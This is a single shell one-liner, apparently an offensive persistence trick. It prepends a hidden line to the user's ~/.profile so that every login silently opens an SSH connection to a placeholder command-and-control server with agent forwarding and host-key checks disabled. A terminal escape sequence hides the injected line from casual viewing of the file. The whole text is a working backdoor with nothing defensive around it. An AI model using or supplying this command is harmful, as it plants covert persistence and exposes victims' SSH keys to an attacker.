 cat <(echo -e "ssh -A -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ssh@YOUR_C2_SERVER>/dev/null 2>&1 & disown #\033[2K\r") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
